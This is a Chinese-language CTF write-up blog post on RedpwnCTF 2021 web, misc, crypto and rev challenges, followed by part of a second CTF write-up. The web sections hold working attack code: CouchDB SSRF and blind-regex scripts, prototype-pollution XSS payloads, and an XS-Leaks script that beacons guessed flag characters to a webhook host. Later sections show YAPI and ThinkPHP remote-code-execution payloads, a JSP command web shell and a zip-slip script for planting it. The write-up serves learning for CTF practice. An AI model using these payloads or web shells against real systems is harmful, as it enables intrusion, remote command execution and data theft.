\u0026#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag\u0026#34; }) ) ) # response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) response = requests.get(\u0026#39;https://requester.mc.ax/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34; } } ] } $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq { \u0026#34;_id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\u0026#34; } 好耶！复制怪好耶！\n虽然上面说了这么多，其实核心思路也挺清晰的，就是先认真分析源码 找出漏洞点是用couchdb创建用户时会自动插入flag 这个过程是使用http请求 我们很容易就可以构造一个url创建用户 让flag进入自己掌控的数据库中，之后就可以顺畅的进行数据库的增删查改；但是这还需要接上题目中给出的testAPI入口才行，又经过一些构造可以成功缝合；但是由于鸡贼的设置 testAPI处的请求只会返回成功或失败，为了确切的得到flag，我们利用了couchdb的_replicator这个好东西来进行一个数据的复制，得到flag~~~\n————以下是第二种解法: char-by-char-blind-sqli\n源码的分析不变，这是根本，差异之处首先在于构造url时这里利用了couchdb的另一个好东西_find\ncurl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \u0026#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find\u0026#39; --data \u0026#39;{\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;.*\u0026#34;}}}\u0026#39; 本地测试可以成功会显出flag；第二个差异在缝合testAPI的时候，由于filter对于大小写不太敏感，所以大写Couch来绕过了；同样面临回显只有成功或失败 但是char-by-char-blind-sqli无所畏惧~\nimport urllib.parse import requests import json import string # first, make a request to # /createUser?username=strellicsquad\u0026amp;password=12345 alphabet = \u0026#34;etoanihsrdlucgwyfmpbkvjxqz{}_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ\u0026#34; def test_regex(regex): url = \u0026#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find\u0026#34; data = json.dumps({\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: regex}}}) r = requests.get(f\u0026#34;https://requester.mc.ax/testAPI/?url={urllib.parse.quote(url)}\u0026amp;method=POST\u0026amp;data={urllib.parse.quote(data)}\u0026#34;) return \u0026#34;Something went wrong\u0026#34; in r.text flag = \u0026#34;flag{\u0026#34; while not flag.endswith(\u0026#34;}\u0026#34;): for c in alphabet: check = \u0026#34;^\u0026#34; + flag + c + \u0026#34;.*\u0026#34; if test_regex(check): print(f\u0026#34;found {c} -\u0026gt; {flag}{c}\u0026#34;) flag += c break 也可以拿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\n————最悲催的莫过于之后我也用docker在本地起了一个环境 但是初始化有问题，导致localhost:5984无法访问\n我搜了一下 有相关问题的解答 但都不明确……\n从这个报错看 应该是说题目相关的需要的database_does_not_exist，但是用于初始化的/_utils也无法访问，直接curl 127.0.0.1:5984也是失败，curl couchdb:5984也是失败，处理报错真是心累\nweb/requester-strikes-back Java was found to not be the future. Can you take down requester again?\n源码处有一处修改if (urlURI.getHost().toLowerCase().contains(\u0026quot;couchdb\u0026quot;))\n这使得我们不能用之前的Couchdb大写的方式来绕过，但是\n结合Incorrect handling of malformed authority component by URIUtils#extractHost\n我们只需要把之前的url改成http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find即可（解法二）\n解法一直接跑就行 一样能通\n相关的一些ssrf前置知识\u0026amp;url解析问题仍然可以看这里：A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai（好厉害的ppt）\n参考：wp1 wp2\nweb/pastebin-1 Ah, the classic pastebin.\npastebin-1.mc.ax\nAdmin bot\nDownloads - main.rs\npastebin，类似留言板的样子 可以发表paste\n第一反应就是xss，试一下alert(1) 成功弹窗\n题目另外提供了一个/admin-bot页面，\n这个，妥妥的xss好吧 直接xss platform一把梭！\n***web/pastebin-2-social-edition Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.\npastebin-2-social-edition.mc.ax\nAdmin bot\n这次adminbot会给自己的paste下面留言回复\n显然啊 还是xss，但是用了DOMPurify，并且这个版本也很新 之前的一些bug也没法利用，参考wp\n看源码\n注意到这里，如果有错误 就会设置errorContainer.innerHTML = message;，如果我们能控制error message 就能做到xss了；这里利用原型污染prototype pollution，即使DOMPurify可以阻挡一些xss常用的标签或者属性，也阻止不了原型污染\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 我们可以把error污染成任意值，message污染为xss内容和payload\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;error\u0026#34;] = \u0026#34;1\u0026#34;; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;message\u0026#34;] = \u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34;; 当请求被触发时，error和message就都是我们自定的值了；虽然DOMPurify会对__proto__进行移除，但是因为上面const fieldsetName = decodeURIComponent(fieldset.name);，所以再对__proto__来一手urlencode就能绕过了\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;%255F_proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; ***web/pastebin-3 Boy, there sure are a lot of pastebins. Gotta think of new themes\u0026hellip;\nPlease put a reasonably secure password when making an account\n还是一个很简单的页面 create paste，增加了一个搜索的功能\n先看/view路由\n我们的便签 总体会以一个url的形式放入iframe中，接着去看看sanbox_url的渲染情况\n而亮点是，我们的paste又被直接放入反引号中间了，如果我们用类似${alert(1)}的东西直接就可以跑js了！\n现在我们有了可以操作js代码的地方——但是这是在sandbox中，与主页面并不是同源的🤔\n再看看新加入的search功能\n————这里要先插播一条知识了 XSLeaks（更多的相关参考链接放到后面了），一个常见的xsleak攻击详见error events\nCross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. ——from XSLeaks wiki\n/search使用的是flask中的flash()消息闪现来展示搜索的结果，它会存储在session cookie中，如果消息比会话cookie大的话会导致消息闪现静默失败——我们利用这一条特性，用长长的cookie，如果请求成功 那么需要显示flash时cookie将会超过限制报错，而请求失败 就只有No results found短短的一条，不会报400\n我们用XSLeaks wiki上给出的 probeError snippet\nfunction probeError(url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; console.log(\u0026#39;Onload event triggered\u0026#39;); script.onerror = () =\u0026gt; console.log(\u0026#39;Error event triggered\u0026#39;); document.head.appendChild(script); } 虽然同站的cookies（same-site cookies）通常会阻止这种情况，但由于题中的sandbox是子域，并不是同站的情况，所以probeError可以检测到，下面是脚本\nconst alphabet = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; function set() { document.cookie = `a=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` document.cookie = `b=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` } function unset() { document.cookie = `a=; domain=.pastebin-3.mc.ax` document.cookie = `b=; domain=.pastebin-3.mc.ax` } function probeError(url) { return new Promise(resolve =\u0026gt; { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; resolve(false); script.onerror = () =\u0026gt; resolve(true); document.head.appendChild(script); }); } function wait(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } (async () =\u0026gt; { let prefix = \u0026#34;flag{c00k13_b0mb1n6_15_f4k3_vu\u0026#34;; set(); navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded\u0026#39;); while (!prefix.endsWith(\u0026#39;}\u0026#39;)) { for (let i = 0; i \u0026lt; alphabet.length; i++) { let attempt = prefix + alphabet[i]; let subwindow = window.open(\u0026#34;https://pastebin-3.mc.ax/search?query=\u0026#34; + encodeURIComponent(attempt)); await wait(500); subwindow.close(); if (await probeError(\u0026#34;https://pastebin-3.mc.ax/home\u0026#34;)) { navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?\u0026#39; + attempt); unset(); prefix = attempt; break; } } } })(); 为了引入这个脚本，我们新建一个paste\n${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)} 其他几个版本的脚本：ver2 ver3\n参考：XSLeaks | Side Channel Vulnerabilities on the Web - Detection and Preventio | Flask 消息闪现\nweb/wtjs Ya like golf? How about JS golf?\nwtjs.mc.ax | Admin bot\nDownloads: wtjs.tar\n………………有字数限制的fuckjs，我不会构造 太痛苦了\nwp参见一张google sheet wp2\n不得不说，这个sheet真的是相当清晰了……用9张表 详细的写了一下到底是怎么把最终的payload给拼出来的，真的是现代版活字印刷 绝了 数字民工是吧😅\n属实是蚌埠住了😅\n***web/MdBin Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies™, including React, this pastebin has you covered, with brand-new theming support!\nmdbin.mc.ax\nSubmit to the admin at admin-bot.mc.ax/mdbin; the flag is in a cookie.\nDownloads: mdbin.tar.gz\n参考：wp1 wp2\n直接放参考的wp链接吧，还是js原型污染的问题，但是由于我对js原型污染这个问题了解的不够深入，也只能照猫画虎的复现，还有很多资料需要额外的去补充地看，就不班门弄斧了，上面的两个链接里写的都很好！\n***web/lazy-admin Looks like another service with no functionality. I hope the admin is doing their job\u0026hellip;\nlazy-admin.mc.ax\nDownloads: lazy-admin.tar.gz\n参考：wp\n难，我不懂\nmisc/sanity-check I get to write the sanity check challenge! Alright!\nflag{1_l0v3_54n17y_ch3ck_ch4ll5}\nmisc/discord Join the discord! I hear #rules is an incredibly engaging read.\nmisc/compliant-lattice-feline get a flag! nc mc.ax 31443\n*misc/the-substitution-game nc mc.ax 31996\nDownloads: chall.py\nMarkov Algorithm罢了\n参见：Markov Algorithm Online\nmisc/annaBEL-lee sounds from a kingdom by the sea\nThe server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.\nWhat exactly is the server sending? Sometimes it makes a sound, sometimes it doesn\u0026rsquo;t. Plotting it on a chart might help you see something.\nIt might be helpful to turn your sound on, but you\u0026rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enough—maybe slow it down to get a better idea.\nThis is not audio steganography. Apologies if anyone went down that route.\nnc mc.ax 31845\nnc连入后没有任何可视的回显，但是藏在了声音信息里\n\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00 导出，有两种值：no bell(\\x00) bell(\\x07)，转化为0与1\n101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000 改为莫斯电码的样子\n.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.- 解密\nLETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L) flag{d1ng-d0n9-g0es-th3-anna-b3l}\ncrypto/scissor I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf\nDownloads: encrypt.py\ncrypto/baby I want to do an RSA!\nDownloads: output.txt\nn: 228430203128652625114739053365339856393 e: 65537 c: 126721104148692049427127809839057445790 一点都不会crypto…… 其实查一下RSA n e c其实就能做出来后面的东西了\nRSA decryption using only n e and c 然后就会知道这个东西 Ganapati/RsaCtfTool，或者这个在线网站 RSA Cipher\n为了decode首先需要根据N求出两个互质的p和q，可以用这个网站来做 整数分解工具\n之后就可以愉快的解密了！\nrev/wstrings Some strings are wider than normal\u0026hellip;\nDownloads: wstrings\nflag{n0t_al1_str1ngs_ar3_sk1nny}\nrev/bread-making My parents aren\u0026rsquo;t home! Quick, help me make some bread please\u0026hellip; nc mc.ax 31796\nDownloads: bread\n参考：wp2 wp3 wp4\n我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的\nadd ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}\n调试的过程是linux下的py脚本\nfrom pwn import * p = remote(\u0026#34;mc.ax\u0026#34;, 31796) p.sendlineafter(\u0026#34;bowl\u0026#34;, \u0026#34;add flour\u0026#34;) p.sendlineafter(\u0026#34;flour has been added\u0026#34;, \u0026#34;add yeast\u0026#34;) p.sendlineafter(\u0026#34;yeast has been added\u0026#34;, \u0026#34;add salt\u0026#34;) p.sendlineafter(\u0026#34;salt has been added\u0026#34;, \u0026#34;add water\u0026#34;) p.sendlineafter(\u0026#34;lumpy dough\u0026#34;, \u0026#34;hide the bowl inside a box\u0026#34;) p.sendlineafter(\u0026#34;to rise\u0026#34;, \u0026#34;wait 3 hours\u0026#34;) p.sendlineafter(\u0026#34;finish the dough\u0026#34;, \u0026#34;work in the basement\u0026#34;) p.sendlineafter(\u0026#34;needs to be baked\u0026#34;, \u0026#34;preheat the toaster oven\u0026#34;) p.sendlineafter(\u0026#34;for 45 minutes\u0026#34;, \u0026#34;set a timer on your phone\u0026#34;) p.sendlineafter(\u0026#34;awfully long time\u0026#34;, \u0026#34;watch the bread bake\u0026#34;) p.sendlineafter(\u0026#34;no time to waste\u0026#34;, \u0026#34;pull the tray out with a towel\u0026#34;) p.sendlineafter(\u0026#34;smoke in the air\u0026#34;, \u0026#34;unplug the fire alarm\u0026#34;) p.sendlineafter(\u0026#34;in another room\u0026#34;, \u0026#34;open the window\u0026#34;) p.sendlineafter(\u0026#34;air rushes in\u0026#34;, \u0026#34;unplug the oven\u0026#34;) p.sendlineafter(\u0026#34;kitchen is a mess\u0026#34;, \u0026#34;wash the sink\u0026#34;) p.sendlineafter(\u0026#34;sink is cleaned\u0026#34;, \u0026#34;clean the counters\u0026#34;) p.sendlineafter(\u0026#34;counters are cleaned\u0026#34;, \u0026#34;flush the bread down the toilet\u0026#34;) p.sendlineafter(\u0026#34;is disposed of\u0026#34;, \u0026#34;get ready to sleep\u0026#34;) p.sendlineafter(\u0026#34;go to sleep\u0026#34;, \u0026#34;close the window\u0026#34;) p.sendlineafter(\u0026#34;window is closed\u0026#34;, \u0026#34;replace the fire alarm\u0026#34;) p.sendlineafter(\u0026#34;alarm is replaced\u0026#34;, \u0026#34;brush teeth and go to bed\u0026#34;) p.interactive() p.close() 这个脚本的逻辑是通过bread文件导出的文本，找出最符合逻辑的上下文 然后利用sendlineafer来解题；实际做题的话不可能只靠打字来试这个顺序 不是说试这个浪费时间 而是等待的时间非常非常短暂 没有完整打完字的时间\n后记 这次的redpwn有47道题，各个方向都有适合我这种签到选手的简单题，好评~\n就是打星号的题涉及到的js原型污染问题，光靠这一两个题搞不太懂，但是最近的反序列化问题还没总结完，三心二意的也不太好，但是之后一定会回来看的！！！等着被鞭尸吧 哼\n","date":"2021-08-08T20:08:39+08:00","permalink":"https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/","section":"posts","tags":["wp"],"title":"RedpwnCTF2021 Wp"},{"categories":["CTF"],"contents":"cat flag 简简单单cat flag\nHint: 管理员曾访问过flag\n\u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt; 提示管理员访问过，先cat /var/log/nginx/access.log\n之后用%fa绕过 /?cmd=this_is_final_fl%faag_e2a457126032b42d.php\nreview - Nginx 重要文件目录：\n配置文件存放目录：/etc/nginx 主要配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx/access.log ezrce 你真的会 nodejs 吗？\n是一个YAPI的主页，根据题目里rce的提示 搜搜看已知的漏洞：Yapi 存在远程命令执行漏洞\n那就好办了 跟着来就行咯；首先创建一个项目\n之后修改全局mock脚本\nconst sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(\u0026#39;return process\u0026#39;) const process = myfun() mockjson = process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;command\u0026#34;).toString() 之后添加接口\n脚本中的execSync()处可rce，先用wget http://xxxxx.burpcollaborator.net试试水\n很顺利嘛 好耶！\ncat `ls`\t// spawnSync /bin/sh ENOBUFS cat `cd ../;ls`\t// config.json, init.lock, log, vendors cat `cd ../../;ls`\t// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var cd ../../;cat `ls`\t// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var cat `cd ../../;cat ffffffflllllaggggg`\t// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b} easythinkphp easythinkphp\n只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报\n/index.php?m=--\u0026gt;\u0026lt;?=phpinfo();?\u0026gt; /index.php?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log 先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马\n/index.php?m=--\u0026gt;\u0026lt;?=eval($_POST[\u0026#39;wuhu\u0026#39;]);?\u0026gt; 传入后 用蚁剑连接就能拿flag了~\n或者也可以直接使用ThinkphpGUI一把梭！一键getshell 你值得拥有\njspxcms 也有现成的洞可以直接用，参考：复现jspxcms解压getshell漏洞 | 代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540) | 记一次由追踪溯源发现的“不安全解压getshell”\n首先构造含jsp🐎的恶意war包，🐎长这样\n\u0026lt;% if(\u0026#34;023\u0026#34;.equals(request.getParameter(\u0026#34;pwd\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026#34;wuhu\u0026#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } %\u0026gt; 之后放入一个解压后会自动完成目录穿越的zip包中 这个过程由py脚本完成\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary = b\u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;helloworld\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; zipFile = zipfile.ZipFile(\u0026#34;test123.zip\u0026#34;, \u0026#34;a\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test123.zip\u0026#34;) zipFile.writestr(\u0026#34;../../../../dog123.html\u0026#34;, binary) zipFile.close() except IOError as e: raise e import zipfile z = zipfile.ZipFile(\u0026#39;test123.zip\u0026#39;, \u0026#39;a\u0026#39;, zipfile.ZIP_DEFLATED) with open(\u0026#39;wuhu.war\u0026#39;, \u0026#39;rb\u0026#39;)as f: temp = f.read() z.writestr(\u0026#39;../../../../wuhu.war\u0026#39;, temp) z.close() 需要注意的是 最终我们要穿越到的目录是网站根目录的上层，即webapps目录下 与ROOT目录同级，当war包位于这个目录下才会自动部署\n直接cat /flag就好啦\ncybercms 赛博CMS，只为安全而生\nHint：信息搜集是一个web手必备的技能\n一个（伪）cms平台介绍的页面，比较简陋，首页/应用案例处显示hacked by ymnh，在ymnh的咨询页面处有这样的报错\n在首页/新闻动态处，几乎所有的帖子都是hacked by xxx~~（本来我还以为是多么复杂的长篇大论）~~，在如何安装和使用模板这篇下有没删干净的东西\n如何设置进站语言这篇里竟然是这样的\n草 真是蚌埠住了 